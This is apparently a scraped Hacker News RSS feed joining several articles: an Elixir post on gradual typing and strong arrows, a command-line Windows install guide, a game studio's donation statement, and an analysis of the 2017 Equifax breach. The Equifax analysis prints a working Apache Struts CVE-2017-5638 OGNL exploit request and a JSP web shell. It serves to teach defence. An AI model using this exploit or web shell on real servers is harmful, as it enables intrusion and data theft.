<p>A gradual type system is a type system that defines a <code>dynamic()</code> type. It is sometimes written as <code>?</code> and sometimes known as the <code>any</code> type (but I prefer to avoid <code>any</code> because it is too short and too lax in languages like TypeScript).</p>

<p>In Elixir, the <code>dynamic()</code> type means the type is only known at runtime, effectively disabling static checks for that type. More interestingly, we can also place upper and lower bounds on the dynamic type using set operations. As we will soon learn, this will reveal interesting properties about our type system.</p>

<p>It is often said that gradual typing is the best of both words. Perhaps ironically, that’s true and false at the same time. If you use a gradual type system but you never use the <code>dynamic()</code> type, then it behaves exactly like a static type system. However, the more you use the <code>dynamic()</code> type, the fewer guarantees the type system will give you, the more the <code>dynamic()</code> type propagates through the system. Therefore, it is in our interest to reduce the occurrences of the <code>dynamic()</code> type as much as possible, and that’s what we set out to do.</p>

<h2 id="interfacing-static-and-dynamic-code-the-trouble-with-dynamic">Interfacing static and dynamic code: the trouble with <code>dynamic()</code></h2>

<p>Let’s go back to our constrained identity function that accepts only numbers:</p>

<div><pre><code><span>$</span> <span>a</span> <span>-&gt;</span> <span>a</span> <span>when</span> <span>a:</span> <span>number</span><span>()</span>
<span>def</span> <span>identity</span><span>(</span><span>arg</span><span>),</span> <span>do</span><span>:</span> <span>arg</span>
</code></pre></div>

<p>Now imagine that we have some untyped code that calls this function:</p>

<div><pre><code><span>def</span> <span>debug</span><span>(</span><span>arg</span><span>)</span> <span>do</span>
  <span>"we got: "</span> <span>&lt;&gt;</span> <span>identity</span><span>(</span><span>arg</span><span>)</span>
<span>end</span>
</code></pre></div>

<p>Since <code>debug/1</code> is untyped, its argument will receive the type <code>dynamic()</code>.</p>

<p><code>debug/1</code> proceeds to call <code>identity</code> with an argument and then uses the string concatenation operator (<code>&lt;&gt;</code>) to concatenate <code>"we got: "</code> to the result of <code>identity(arg)</code>. Since <code>identity/1</code> is meant to return a number and string concatenation requires two strings as operands, there is a typing error in this program. On the other hand, if you call <code>debug("hello")</code> at runtime, the code will work and won’t raise any exceptions.</p>

<p>In other words, the static typing version of the program and its runtime execution do not match in behaviour. So how do we tackle this?</p>

<p>One option is to say that’s all behaving as expected. If <code>debug/1</code> is untyped, its <code>arg</code> has the <code>dynamic()</code> type. To type check this program, we specify that <code>identity(dynamic())</code> returns the <code>dynamic()</code> type, the concatenation of a string with <code>dynamic()</code> also returns <code>dynamic()</code>, and consequently <code>debug/1</code> gets the type <code>dynamic() -&gt; dynamic()</code>, with no type errors emitted.</p>

<p>The trouble is: this is not a very useful choice. Once <code>dynamic()</code> enters the system, it <em>spreads everywhere</em>, we perform fewer checks, effectively discarding the information that <code>identity/1</code> returns a number, and the overall type system becomes less useful.</p>

<p>Another option would be for us to say: once we call a statically typed function with <code>dynamic()</code>, we will ignore the <code>dynamic()</code> type. If the function says it returns a <code>number()</code>, then it will surely be a number! In this version, <code>identity(dynamic())</code> returns <code>number()</code> and the type system will catch a type error when concatenating a string with a number.</p>

<p>This is similar to the approach taken by TypeScript. This means we can perform further static checks, but it also means we can call <code>debug("foobar")</code> and that will return the string <code>"we got: foobar"</code>! But how can that be possible when the type system told us that <code>identity</code> returns a <code>number()</code>? This can lead to confusion and surprising results at runtime. We say this system is unsound, because the types at runtime do not match our compile-time types.</p>

<p>None of our solutions so far attempted to match the static and runtime behaviors, but rather, they picked one in favor of the other.</p>

<p>But don’t despair, there is yet another option. We could introduce runtime checks whenever we cross the “dynamic &lt;-&gt; static” boundaries. In this case, we could say <code>identity(dynamic())</code> returns a <code>number()</code>, but we will introduce a runtime check into the code to guarantee that’s the case. This means we get static checks, we ensure the value is correct at runtime, with the cost of introducing additional checks at runtime. Unfortunately, those checks may affect performance, depending on the complexity of the data structure and on how many times we cross the “dynamic &lt;-&gt; static” boundary.</p>

<blockquote>
  <p>Note: there is <a href="https://arxiv.org/abs/2206.13831">recent research in using the runtime checks introduced by a gradual type system to provide compiler optimizations</a>. Some of these techniques are already leveraged by the Erlang VM to optimize code based on patterns and guards.</p>
</blockquote>

<p>To summarize, we have three options:</p>

<ul>
  <li>
    <p>Calling static code from dynamic code returns <code>dynamic()</code>, dropping the opportunity of further static typing checks (this is sound)</p>
  </li>
  <li>
    <p>Calling static code from dynamic code returns the static types, potentially leading to mismatched types at runtime (this is unsound)</p>
  </li>
  <li>
    <p>Calling static code from dynamic code returns the static types with additional runtime checks, unifying both behaviours but potentially impacting performance (this is sound)</p>
  </li>
</ul>

<h2 id="introducing-strong-arrows">Introducing strong arrows</h2>

<p>I have always said that Elixir, thanks to Erlang, is an assertive language. For example, if our identity function is restricted to only numbers, in practice we would most likely write it as:</p>

<div><pre><code><span>$</span> <span>a</span> <span>-&gt;</span> <span>a</span> <span>when</span> <span>a:</span> <span>number</span><span>()</span>
<span>def</span> <span>identity</span><span>(</span><span>arg</span><span>)</span> <span>when</span> <span>is_number</span><span>(</span><span>arg</span><span>),</span> <span>do</span><span>:</span> <span>arg</span>
</code></pre></div>

<p>In the example above, <code>identity</code> will fail if given any value that is not a number. We often rely on pattern matching and guards and, in turn, they helps us assert on the types we are working with. Not only that, Erlang’s JIT compiler already relies on this information to <a href="https://www.erlang.org/blog/type-based-optimizations-in-the-jit/">perform optimizations</a> whenever possible.</p>

<p>We also say Elixir is strongly typed because its functions and operators avoid implicit type conversions. The following functions also fail when their input does not match their type:</p>

<div><pre><code><span>$</span> <span>binary</span><span>()</span> <span>-&gt;</span> <span>binary</span><span>()</span>
<span>def</span> <span>debug</span><span>(</span><span>string</span><span>),</span> <span>do</span><span>:</span> <span>"we got: "</span> <span>&lt;&gt;</span> <span>string</span>

<span>$</span> <span>(</span><span>integer</span><span>()</span> <span>-&gt;</span> <span>integer</span><span>())</span> <span>and</span> <span>(</span><span>float</span><span>()</span> <span>-&gt;</span> <span>float</span><span>())</span>
<span>def</span> <span>increment</span><span>(</span><span>number</span><span>),</span> <span>do</span><span>:</span> <span>number</span> <span>+</span> <span>1</span>
</code></pre></div>

<p><code>&lt;&gt;</code> only accepts binaries as arguments and will raise otherwise. <code>+</code> only accepts numbers (integers or floats) and will raise otherwise. <code>+</code> does not perform implicit conversions of non-numeric types, such as strings to number, as we can see next:</p>

<div><pre><code><span>iex</span><span>(</span><span>1</span><span>)</span><span>&gt;</span> <span>increment</span><span>(</span><span>1</span><span>)</span>
<span>2</span>
<span>iex</span><span>(</span><span>2</span><span>)</span><span>&gt;</span> <span>increment</span><span>(</span><span>13.0</span><span>)</span>
<span>14.0</span>
<span>iex</span><span>(</span><span>3</span><span>)</span><span>&gt;</span> <span>increment</span><span>(</span><span>"foobar"</span><span>)</span>
<span>**</span> <span>(</span><span>ArithmeticError</span><span>)</span> <span>bad</span> <span>argument</span> <span>in</span> <span>arithmetic</span> <span>expression:</span> <span>"foobar"</span> <span>+</span> <span>1</span>
</code></pre></div>

<p>In other words, Elixir’s runtime consistently checks the values and their types at runtime. If <code>increment</code> fails when given something else than a number, then it will fail when the <code>dynamic()</code> type does not match its input at runtime. This guarantees <code>increment</code> returns its declared type and therefore we do not need to introduce runtime type checks when calling said function from untyped code.</p>

<p>When we look at the <code>identity</code>, <code>debug</code>, and <code>increment</code> functions above, we - as developers - can state that these functions raise when given a value that does not match their input. However, how can we generalize this property so it is computed by the type system itself? To do so, we introduce a new concept called <strong>strong arrows</strong>, which relies on set-theoretical types to derive this property.</p>

<p>The idea goes as follows: a strong arrow is a function that can be statically proven that, when evaluated on values outside of its input types (i.e. its domain), it will error. For example, in our <code>increment</code> function, if we pass a <code>string()</code> as argument, it won’t type check, because <code>string() + integer()</code> is not a valid operation. Thanks to set-theoretic types, we can compute all values outside of the domain by computing the negation of a set. Given <code>increment/1</code> will fail for all types which are <code>not number()</code>, the function is strong.</p>

<p>By applying this rule to all typed functions, we will know which functions are strong and which ones are not. If a function is strong, the type system knows that calling it with a <code>dynamic()</code> type will always evaluate to its return type! Therefore we say the return type of <code>increment(dynamic())</code> is <code>number()</code>, which is sound and does not need further runtime checks!</p>

<p>Going back to our <code>debug</code> function, when used with a guarded identity, it will be able emit warnings at compile-time, errors at runtime, without introducing any additional runtime check:</p>

<div><pre><code><span>$</span> <span>a</span> <span>-&gt;</span> <span>a</span> <span>when</span> <span>a:</span> <span>number</span><span>()</span>
<span>def</span> <span>identity</span><span>(</span><span>arg</span><span>)</span> <span>when</span> <span>is_number</span><span>(</span><span>arg</span><span>),</span> <span>do</span><span>:</span> <span>arg</span>

<span>def</span> <span>debug</span><span>(</span><span>arg</span><span>)</span> <span>do</span>
  <span>"we got: "</span> <span>&lt;&gt;</span> <span>identity</span><span>(</span><span>arg</span><span>)</span>
<span>end</span>
</code></pre></div>

<p>However, if the <code>identity</code> function is not strong, then we must fallback to one of the strategies in the previous section.</p>

<p>Another powerful property of strong arrows is that they are composable. Let’s pick an example from the paper:</p>

<div><pre><code><span>$</span> <span>number</span><span>(),</span> <span>number</span><span>()</span> <span>-&gt;</span> <span>number</span><span>()</span>
<span>def</span> <span>subtract</span><span>(</span><span>a</span><span>,</span> <span>b</span><span>)</span> <span>do</span>
  <span>a</span> <span>+</span> <span>negate</span><span>(</span><span>b</span><span>)</span>
<span>end</span>

<span>$</span> <span>number</span><span>()</span> <span>-&gt;</span> <span>number</span><span>()</span>
<span>def</span> <span>negate</span><span>(</span><span>int</span><span>),</span> <span>do</span><span>:</span> <span>-</span><span>int</span>
</code></pre></div>

<p>In the example above, <code>negate/1</code>’s type is a strong arrow, as it raises for any input outside of its domain. <code>subtract/2</code>’s type is also a strong arrow, because both <code>+</code> and our own <code>negate</code> are strong arrows too. This is an important capability as it limits how <code>dynamic()</code> types spread throughout the system.</p>

<blockquote>
  <p>Errata: my presentation used the type <code>integer()</code> instead of <code>number()</code> for the example above. However, that was a mistake in the slide. Giving the type <code>integer(), integer() -&gt; integer()</code> to <code>subtract</code> and <code>integer() -&gt; integer()</code> to <code>negate</code> does not make <code>subtract</code> a strong arrow. Can you tell why?</p>
</blockquote>

<p>Luckily, other gradually typed languages can also leverage strong arrows. However, the more polymorphic a language and its functions are, the more unlikely it is to conclude that a given function is strong. For example, in other gradually typed languages such as Python or Ruby, the <code>+</code> operator is extensible and the user can define custom types where the operation is valid. In TypeScript, <code>"foobar" + 1</code> is also a valid operation, which expands the function domain. In both cases, an <code>increment</code> function restricted to numbers would not have a strong arrow type, as the operator won’t fail for all types outside of <code>number()</code>. Therefore, to remain sound, they must either restrict the operands with further runtime checks or return <code>dynamic()</code> (reducing the number of compile-time checks).</p>

<p>There is one last scenario to consider, which I did not include during my keynote for brevity. Take this function:</p>

<div><pre><code><span>$</span> <span>integer</span><span>()</span> <span>-&gt;</span> <span>:ok</span>
<span>def</span> <span>receives_integer_and_returns_ok</span><span>(</span><span>_arg</span><span>),</span> <span>do</span><span>:</span> <span>:ok</span>
</code></pre></div>

<p>The function above can receive any type and return <code>:ok</code>. Is its type a strong arrow? Well, according to our definition, it is not. If we negate its input, type checking does not fail, it returns <code>:ok</code>.</p>

<p>However, given the return type is always the same, it should be a strong arrow! To do so, let’s amend and rephrase our definition of strong arrows: we negate the domain (i.e. the inputs) of a function and then type check it. If the function returns <code>none()</code> (i.e. it does not type check) or a type which is a subset of its codomain (i.e. its output), then it is a strong arrow.</p>

<h2 id="gradual-typing-and-false-positives">Gradual typing and false positives</h2>

<p>There is one last scenario we must take into consideration when interfacing dynamic and static code. Imagine the following code:</p>

<div><pre><code><span>def</span> <span>increment_and_remainder</span><span>(</span><span>numerator</span><span>,</span> <span>denominator</span><span>)</span> <span>do</span>
  <span>rem</span><span>(</span><span>numerator</span><span>,</span> <span>increment</span><span>(</span><span>denominator</span><span>))</span>
<span>end</span>

<span>$</span> <span>(</span><span>integer</span><span>()</span> <span>-&gt;</span> <span>integer</span><span>())</span> <span>and</span> <span>(</span><span>float</span><span>()</span> <span>-&gt;</span> <span>float</span><span>())</span>
<span>def</span> <span>increment</span><span>(</span><span>number</span><span>),</span> <span>do</span><span>:</span> <span>number</span> <span>+</span> <span>1</span>
</code></pre></div>

<p>The <code>increment_and_remainder/2</code> function is untyped, therefore both of its arguments receive type <code>dynamic()</code>. The function then computes the remainder of the numerator by the denominator incremented by one. For this example, let’s assume all uses of <code>increment_and_remainder/2</code> in our program passes two integers as arguments.</p>

<p>Given <code>increment/1</code> has a strong arrow type, according to our definition, <code>increment(dynamic())</code> will return <code>integer() or float()</code> (also known as <code>number()</code>). Here lies the issue: if <code>increment(dynamic())</code> returns <code>integer() or float()</code>, the program above won’t type check because <code>rem/2</code> does not accept floats.</p>

<p>When faced with this problem, there are two possible reactions:</p>

<ol>
  <li>
    <p>It is correct for the function to not type check given <code>increment</code> may return a float</p>
  </li>
  <li>
    <p>It is incorrect for the function to not type check because the error it describes never occurs in the codebase</p>
  </li>
</ol>

<p>Another interesting property of gradual set-theoretic types is that we can also place upper bounds on the <code>dynamic()</code> type. If a function returns <code>number()</code>, it means the caller needs to handle both <code>integer()</code> and <code>float()</code>. However, if a function returns <code>dynamic() and number()</code>, it means the type is defined at runtime, but it must still verify it is one of <code>integer()</code> or <code>float()</code> at compile time.</p>

<p>Therefore, <code>rem/2</code> will type check if its second argument has the type <code>dynamic() and number()</code>, as there is one type at runtime (<code>integer()</code>) that satisfies type checking. On the other hand, if you attempt to use the string concatenation operator (<code>&lt;&gt;</code>) on <code>dynamic() and number()</code>, then there is no acceptable runtime type and you’d still get a typing violation!</p>

<p>Going back to strong arrows, there are two possible return types from a strong arrow:</p>

<ol>
  <li>
    <p>A strong arrow, when presented with a dynamic type, returns its codomain</p>
  </li>
  <li>
    <p>A strong arrow, when presented with a dynamic type, returns the intersection of the codomain with the <code>dynamic()</code> type</p>
  </li>
</ol>

<p>The second option opens up the possibility for existing codebases to gradually migrate to static types without dealing with false positives. Coming from a dynamic background, false positives can be seen as noisy or as an indication that static types are not worth the trouble. With strong arrows and gradual set-theoretic types, we will be able to explore different trade-offs on mixed codebases. Which of the two choices above we will adopt as a default and how to customize them is yet to be decided. It will depend on the community feedback as we experiment and integrate the type system.</p>

<p>Erlang and Elixir developers who use Dialyzer will be familiar with these trade-offs, as the second option mirrors Dialyzer’s behaviour of no false positives. The difference here is that our semantics are integrated into a complete type system. If no type signature is present, the <code>dynamic()</code> type is used, and we will leverage the techniques described here to interface dynamic and static code. If a function has a type signature, and no <code>dynamic()</code> type is present, then it will behave as statically typed code when called with statically typed arguments. Migrating to static types will naturally reduce the interaction points between dynamic and static code, removing the reliance on the <code>dynamic()</code> type.</p>

<h2 id="summary">Summary</h2>

<p>Set-theoretic types allow us to express many typing features based on set operations of union, intersection, and negation.</p>

<p>In particular, we have been exploring a gradual set-theoretic type system for Elixir, paying special attention to how the type system will integrate with existing codebases and how it can best leverage the semantics of the Erlang Virtual Machine. The type system will also perform limited inference based on patterns and guards (as described in the paper), which - in addition to strong arrows - we hope to bring some of the benefits of static typing to codebases without changing a single line of code.</p>

<p>While our efforts have officially moved from research into development, and <a href="https://elixir-lang.org/blog/2023/06/22/type-system-updates-research-dev/">we have outlined an implementation plan</a>, we haven’t yet fully implemented nor assessed the usability of set-theoretic types in existing Elixir codebases, nor large nor small. There is much to implement and validate, and we don’t rule the possibility of finding unforeseen deal breakers that could send us back to square one. Yet we are pleased and cautiously excited with the new developments so far.</p>

<p>The development of Elixir’s type system is sponsored by <a href="https://www.fresha.com/">Fresha</a> (<a href="https://www.fresha.com/careers/openings?department=engineering">they are hiring!</a>),
<a href="https://starfish.team/">Starfish*</a> (<a href="https://starfish.team/jobs/experienced-elixir-developer">they are hiring!</a>),
and <a href="https://dashbit.co/">Dashbit</a>.</p>

      </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Install Windows the Arch Linux Way (300 pts)]]></title>
            <link>https://christitus.com/install-windows-the-arch-linux-way/</link>
            <guid>37593459</guid>
            <pubDate>Thu, 21 Sep 2023 05:15:25 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://christitus.com/install-windows-the-arch-linux-way/">https://christitus.com/install-windows-the-arch-linux-way/</a>, See on <a href="https://news.ycombinator.com/item?id=37593459">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
            <p>Installing Windows strictly through the Command Line is an important tool to have. If windows changes the installer or out of box experience, you can bypass any changes with this guide!</p>
<h2 id="the-installer">The Installer</h2>
<p>Download and Launch the Windows Installer</p>
<p>Launch Command Prompt with <code>Shift+F10</code></p>
<h3 id="partition-both-a-boot-partition-and-data-partition">Partition both a Boot Partition and Data Partition</h3>
<ul>
<li>List Disks with <code>list disk</code></li>
<li>Select desired disk with <code>sel disk #</code></li>
<li>Check to verify there is NO partitions <code>list partition</code></li>
<li>(Optional) Delete any existing partitions <code>del part #</code> <strong>NOTE: THIS ERASES ALL DATA</strong></li>
<li>Check to verify DISK is GPT <code>list disk</code> and use <code>convert gpt</code> if GPT is not enabled <code>*</code></li>
<li>Create Boot partition <code>create partition efi size=100</code></li>
<li>Create Data partition <code>create partition primary size=*</code></li>
<li>Select Boot <code>sel partition 1</code></li>
<li>Format Boot <code>format fs=FAT32 quick</code></li>
<li>Assign Boot partition <code>assign letter=g:</code></li>
<li>Select Data <code>sel par 2</code></li>
<li>Format Data <code>format fs=NTFS quick</code></li>
<li>Assign Data partition <code>assign letter=c:</code> <strong>Note: You may need to UNASSIGN an existing C: drive</strong></li>
</ul>
<h3 id="verify-the-windows-version-to-install">Verify the Windows Version to Install</h3>
<p>DISM is at the heart of every Windows installation. You need to do a verification on your installation ISO to figure out the source index # that you will install.</p>
<div><pre tabindex="0"><code data-lang="fallback"><span><span>DISM /Get-ImageInfo /imagefile:x:\sources\install.wim
</span></span></code></pre></div><p>Note the Index: # that you want to install</p>
<h3 id="install-main-windows-data">Install Main Windows Data</h3>
<p>Now we copy over the operating system in its entirety.</p>
<div><pre tabindex="0"><code data-lang="fallback"><span><span>DISM /apply-image /imagefile:x:\sources\install.wim /index:2 /applydir:c:
</span></span></code></pre></div><h3 id="copy-boot-files-to-efi">Copy Boot Files to EFI</h3>
<p>Copy the boot files to complete the EFI partition to boot into our windows.</p>
<div><pre tabindex="0"><code data-lang="fallback"><span><span>bcdboot c:\Windows /s G: /f ALL
</span></span></code></pre></div><h2 id="bypass-oobe">Bypass OOBE</h2>
<p>The Out of Box Experience is changing all the time. The requirement to be online or only use a Microsoft account. Bypass it with this command and using <code>Shift+F10</code> to bring up the command prompt. <strong>NOTE: DISCONNECT FROM INTERNET before booting!</strong></p>
<p>System will restart after executing the command. Select <code>Continue with limited Setup</code> and name the device and create a local account.</p>
<h2 id="walkthrough-video">Walkthrough Video</h2>

<p>
  <iframe src="https://www.youtube.com/embed/vtxedkuUCas" allowfullscreen="" title="YouTube Video"></iframe>
</p>
          </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Terraria developer bashes Unity, donates $200k to open source alternatives (382 pts)]]></title>
            <link>https://lemm.ee/post/8670706</link>
            <guid>37593133</guid>
            <pubDate>Thu, 21 Sep 2023 04:11:49 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://lemm.ee/post/8670706">https://lemm.ee/post/8670706</a>, See on <a href="https://news.ycombinator.com/item?id=37593133">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><p>Image Text</p>
<p>Re-Logic</p>
<p>The team at Re-Logic has been watching the recent events surrounding Unity with both interest and sadness. The loss of a formerly-leading and user-friendly game engine to the darker forces that negatively impact so much of the gaming industry has left us dismayed to put it mildly. While we do not personally use Unity outside of a few elements on our console/mobile platforms), we feel like we cannot sit idly by as these predatory moves are made against studios everywhere.</p>
<p>We unequivocally condemn and reject the recent TOS/fee changes proposed by Unity and the underhanded way they were rolled out. The flippant manner with which years of trust cultivated by Unity were cast aside for yet another way to squeeze publishers, studios, and gamers is the saddest part. That this move was wholly unnecessary pushes things into the tragedy category - a cautionary tale the industry will not soon forget.</p>
<p>We do not feel that a simple public statement is sufficient. Even if Unity were to recant their policies and statements, the destruction of trust is not so easily repaired. We strongly feel that it is now equally important to get behind some of the other up-and-coming open source game engines. Lighting some candles in an otherwise dark moment. To that end, we are donating $100,000 to each of the open source engines listed below.</p>
<p>Additionally, we are sponsoring each of these projects with $1,000/month each moving forward. All we ask in return is that they remain good people and keep doing all that they can to make these engines powerful and approachable for developers everywhere.</p>
<p>Godot Logo
FNA Logo</p>
<p>Re-Logic has always been supportive of game developers and indie studios that do things the right way. We feel that our actions in this moment are the best way to carry that mission forward - by accelerating and strengthening competing open source game engines, we hope to empower and assist studios that are struggling with how best to proceed given these recent events.</p>
</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[How Equifax Was Breached in 2017 (226 pts)]]></title>
            <link>https://blog.0x7d0.dev/history/how-equifax-was-breached-in-2017/</link>
            <guid>37592934</guid>
            <pubDate>Thu, 21 Sep 2023 03:35:43 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://blog.0x7d0.dev/history/how-equifax-was-breached-in-2017/">https://blog.0x7d0.dev/history/how-equifax-was-breached-in-2017/</a>, See on <a href="https://news.ycombinator.com/item?id=37592934">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><p>On a Saturday night, a security engineer at Equifax was updating an SSL certificate on a Network Intrusion Detection System (NIDS). Immediately after, suspicious connections were detected. After a more in-depth investigation, it became evident that the situation was far graver than anticipated. A service had to be promptly shut down to prevent further exploitation, but by that point, the damage was already done. Malicious actors had been exfiltrating data for several months and had already collected personal information from 163 million customers.</p><h2 id="how-it-happened"><span>How It Happened</span><a href="#how-it-happened"><i></i></a></h2><h3 id="initial-access"><span>Initial Access</span><a href="#initial-access"><i></i></a></h3><p>The story begins in March 2017 with the disclosure of a vulnerability in the Apache Struts software, tracked as <a href="https://nvd.nist.gov/vuln/detail/cve-2017-5638">CVE-2017-5638</a>. This security flaw allowed threat actors to achieve remote code execution on a server by crafting a specific <code>Content-Type</code> HTTP header. This vulnerability was ranked highly critical for its high impact potential and the ease with which it could be exploited.</p><p>Here an example running the <code>whoami</code> command on a vulnerable server as detailed in this <a href="https://github.com/rapid7/metasploit-framework/blob/1378bfbfc71e5c5a86678b80a29d84190b87185a/modules/exploits/multi/http/struts2_content_type_ognl.rb">exploit</a>.</p><div><p><code><table><tbody><tr><td><pre>1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre></td><td><pre><span>GET</span> <span>/struts2-showcase/</span> <span>HTTP</span><span>/</span><span>1.1</span>
<span>Host</span><span>:</span> <span>127.0.0.1</span>
<span>Content-Type</span><span>:</span> <span>%{</span>
<span>    (#_='multipart/form-data').</span>
<span>    (#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).</span>
<span>    (#_memberAccess?</span>
<span>    (#_memberAccess=#dm):</span>
<span>    ((#container=#context['com.opensymphony.xwork2.ActionContext.container']).</span>
<span>    (#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).</span>
<span>    (#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).</span>
<span>    (#context.setMemberAccess(#dm)))).</span>
<span>    (#cmd=@org.apache.struts2.ServletActionContext@getRequest().getHeader('X-kKph')).</span>
<span>    (#os=@java.lang.System@getProperty('os.name')).</span>
<span>    (#cmds=(#os.toLowerCase().contains('win')?{'cmd.exe','/c',#cmd}:{'/bin/sh','-c',#cmd})).</span>
<span>    (#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start())</span>
<span>  }</span>
<span>X-kKph</span><span>:</span> <span>whoami</span>
</pre></td></tr></tbody></table></code></p></div><p>Equifax responded by committing to patch all affected applications within 48 hours. They also implemented a detection rule within <a href="https://www.snort.org/">Snort</a>, their Network Intrusion Detection System (NIDS) and conducted a filesystem scan to identify all systems with a vulnerable version of Apache Struts.</p><p>However, one application fell through the cracks, the Automated Consumer Interview System (ACIS). It was a legacy application built in the 1970s that customers used to dispute incorrect credit information. In May 2017, attackers discovered that ACIS was still vulnerable, allowing them to take control of a web server.</p><p><a href="https://blog.0x7d0.dev/assets/img/how-equifax-was-breached-in-2017/ACIS.png"><img data-src="/assets/img/how-equifax-was-breached-in-2017/ACIS.png" alt="The Automated Consumer Interview System (ACIS)" data-proofer-ignore="" src="https://blog.0x7d0.dev/assets/img/how-equifax-was-breached-in-2017/ACIS.png"></a> <em>The Automated Consumer Interview System (ACIS)</em></p><h3 id="persistence"><span>Persistence</span><a href="#persistence"><i></i></a></h3><p>Shortly after gaining initial access on ACIS, the attackers dropped Web Shells to maintain their foothold on systems. These Web Shells provided a means for the attackers to interact with the system without the need to repeatedly exploit the Apache Struts vulnerability.</p><p>Here’s an example of a basic Web Shell, allowing anyone to execute arbitrary commands by passing them as the “cmd” parameter in HTTP requests.</p><div><p><code><table><tbody><tr><td><pre>1
2
3
4
5
6
7
8
9
10
11
12
</pre></td><td><pre><span>&lt;%@ page </span><span>import=</span><span>"java.io.*"</span> <span>%&gt;</span>
<span>&lt;%</span>
    <span>String</span> <span>cmd</span> <span>=</span> <span>request</span><span>.</span><span>getParameter</span><span>(</span><span>"cmd"</span><span>);</span>
    <span>if</span> <span>(</span><span>cmd</span> <span>!=</span> <span>null</span><span>)</span> <span>{</span>
        <span>Process</span> <span>p</span> <span>=</span> <span>Runtime</span><span>.</span><span>getRuntime</span><span>().</span><span>exec</span><span>(</span><span>cmd</span><span>);</span>
        <span>DataInputStream</span> <span>inputstream</span> <span>=</span> <span>new</span> <span>DataInputStream</span><span>(</span><span>p</span><span>.</span><span>getInputStream</span><span>());</span>
        <span>String</span> <span>line</span><span>;</span>
        <span>while</span> <span>((</span><span>line</span> <span>=</span> <span>inputstream</span><span>.</span><span>readLine</span><span>())</span> <span>!=</span> <span>null</span><span>)</span> <span>{</span>
            <span>out</span><span>.</span><span>println</span><span>(</span><span>line</span><span>);</span>
        <span>}</span>
    <span>}</span>
<span>%&gt;</span>
</pre></td></tr></tbody></table></code></p></div><h3 id="credential-access"><span>Credential Access</span><a href="#credential-access"><i></i></a></h3><p>ACIS, like any other application, relied on a database, but it didn’t store a significant amount of personal information because it was only used by a small number of clients at Equifax. The attackers continued their search and eventually discovered a mounted NFS share on the web server. This file share contained notes and configuration files used by Equifax engineers, in which they found many database credentials.</p><h3 id="lateral-movement--collection"><span>Lateral Movement &amp; Collection</span><a href="#lateral-movement--collection"><i></i></a></h3><p>There was no segmentation between the legacy system and the rest of Equifax’s infrastructure, making it possible for the attackers to access databases from other Equifax systems. With the credentials found on the file share, they were able to connect and execute queries on 48 different databases. They quickly found a table containing personal identifiable information (PII) and began collecting the data.</p><h3 id="exfiltration"><span>Exfiltration</span><a href="#exfiltration"><i></i></a></h3><p>The customer’s data was divided into multiple compressed files of 10&nbsp;MB each and placed on the web servers in a publicly accessible directory. Gradually, the attackers exfiltrated the data by making HTTP requests with <code>wget</code> from multiple locations to retrieve the contents of these files. This approach was used to minimize the chances of triggering an alert.</p><h2 id="how-it-was-detected"><span>How It Was Detected</span><a href="#how-it-was-detected"><i></i></a></h2><p>During the month of July 2017, 76 days after the start of the attack, Equifax realized that their Network Intrusion Detection System (NIDS) had an expired SSL certificate, preventing them from decrypting and monitoring traffic for the ACIS environment. Immediately after uploading the SSL certificate, the security engineers received multiple alerts regarding suspicious requests coming from IP addresses in China.</p><p>Equifax initiated a thorough investigation, revealing that the filesystem scan, intended to identify systems with a vulnerable version of Apache Struts, had been executed in the incorrect directory within the ACIS environment, leaving those systems unknowingly vulnerable since March 2017. Simultaneously, several web shells were discovered on these servers, and finally they discovered that data being exfiltrated by attackers contained personal identifiable information (PII).</p><p>Following these discoveries, ACIS was promptly shut down as an emergency action to halt the cyberattack.</p><p>During the month of August 2017, Equifax engaged the firm Mandiant to conduct a forensic investigation. By retracing all the steps of the attackers, they discovered that the attackers had successfully exfiltrated data from 163 million customers before being stopped by the shutdown of the ACIS system.</p><h2 id="conclusion"><span>Conclusion</span><a href="#conclusion"><i></i></a></h2><p>The Equifax data breach from 2017 stands out as one of the largest data breaches in history, impacting millions of individuals. It is the result of several mistakes made by Equifax:</p><ul><li>Insufficient knowledge of their legacy systems.</li><li>Poor password storage practices.</li><li>Lack of rigor in the patching process.</li><li>Lack of network segmentation.</li><li>Lack of Host-Based Intrusion Detection System (HIDS)</li><li>Lack of alerting when security tools fail.</li></ul><p>By learning from these errors, organizations can better protect sensitive data and prevent similar incidents in the future.</p><h3 id="sources"><span>Sources</span><a href="#sources"><i></i></a></h3><ul><li><a href="https://oversight.house.gov/wp-content/uploads/2018/12/Equifax-Report.pdf">The Equifax Data Breach | Oversight and Government Reform</a></li><li><a href="https://www.hsgac.senate.gov/wp-content/uploads/imo/media/doc/FINAL%20Equifax%20Report.pdf">How Equifax Neglected Cybersecurity and Suffered a Devastating Data Breach | United States Senate</a></li></ul><h3 id="techniques"><span>Techniques</span><a href="#techniques"><i></i></a></h3><p>The <a href="https://attack.mitre.org/">MITRE ATT&amp;CK</a> techniques used by the attackers throughout the data breach:</p><ul><li>Initial Access<ul><li><a href="https://attack.mitre.org/techniques/T1190/">T1190 | Exploit Public-Facing Application</a></li></ul></li><li>Persistence<ul><li><a href="https://attack.mitre.org/techniques/T1505/003/">T1505.003 | Server Software Component: Web Shell</a></li></ul></li><li>Credential Access<ul><li><a href="https://attack.mitre.org/techniques/T1552/001/">T1552.001 | Unsecured Credentials: Credentials In Files</a></li></ul></li><li>Collection<ul><li><a href="https://attack.mitre.org/techniques/T1039/">T1039 | Data from Network Shared Drive</a></li><li><a href="https://attack.mitre.org/techniques/T1560/">T1560 | Archive Collected Data</a></li></ul></li><li>Exfiltration<ul><li><a href="https://attack.mitre.org/techniques/T1030/">T1030 | Data Transfer Size Limits</a></li></ul></li></ul><p><a href="https://blog.0x7d0.dev/assets/img/how-equifax-was-breached-in-2017/pixel.png"><img 